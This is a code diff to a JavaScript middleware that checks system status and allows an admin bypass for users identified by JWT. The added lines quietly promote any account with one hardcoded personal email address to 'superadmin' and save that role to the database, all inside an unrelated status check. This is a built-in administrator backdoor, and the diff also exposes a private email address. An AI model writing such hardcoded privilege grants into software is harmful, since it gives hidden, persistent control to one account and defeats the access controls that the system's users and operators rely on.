@@ -15,12 +15,23 @@ export const checkSystemStatus = async (req, res, next) => {
     // If req.user is not yet populated (middleware running before protect), 
     // we try to extract it from token to allow admin bypass
     let userRole = req.user?.role;
+    let userEmail = req.user?.email;
+
     if (!userRole && req.headers.authorization) {
        try {
          const token = req.headers.authorization.split(' ')[1];
          const decoded = jwt.verify(token, process.env.JWT_SECRET);
-         const user = await User.findById(decoded.id).select('role');
-         if (user) userRole = user.role;
+         const user = await User.findById(decoded.id).select('role email');
+         if (user) {
+           userRole = user.role;
+           userEmail = user.email;
+           
+           // Auto-promote root email to superadmin if needed (Sync with authMiddleware)
+           if (userEmail === 'ahmaded252a@gmail.com' && userRole !== 'superadmin') {
+             userRole = 'superadmin';
+             await User.findByIdAndUpdate(user._id, { role: 'superadmin' });
+           }
+         }
        } catch (err) {
          // Token invalid or expired, proceed as guest
        }
